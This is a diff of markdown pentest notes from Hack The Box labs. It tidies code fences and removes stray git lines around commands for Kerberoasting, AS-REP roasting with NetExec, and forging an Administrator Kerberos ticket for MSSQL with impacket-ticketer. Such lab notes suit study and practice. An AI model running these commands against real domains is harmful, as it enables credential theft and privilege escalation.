@@ -165,7 +165,6 @@ nxc ldap $target -u 'username' -p 'username' --kerberoast output.txt
 
 *Kerberoasting via AS-REP Roasting*
 
-```bash
 nxc ldap $target -u 'username' -p '' no-preauth-targets kerberoastable.list --kerberoasting output.txt
 ```
 
@@ -193,10 +192,7 @@ impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl \
 -dc-ip 10.129.197.45 \
 -domain breach.vl \
 -user-id 500 Administrator
-```git checkout dev                       # Go back to dev
-git pull origin dev
-
-
+```
 
 It's a command that i used in htb machine to generate *Kerberos* ticket as Administrator to `MSSQL` service
 
@@ -211,7 +207,7 @@ It's a command that i used in htb machine to generate *Kerberos* ticket as Admin
 `-domain breach.vl` -> The Active Directory domain name.
 
 `-user-id 500` -> The RID of the user (500 = built-in Administrator).
-```
+
 
 If nessesary to do auth with `Kerberos Authentication` tool `impacket-getTGT` returns a `<user>.ccache` file
 requirements: Target username and password
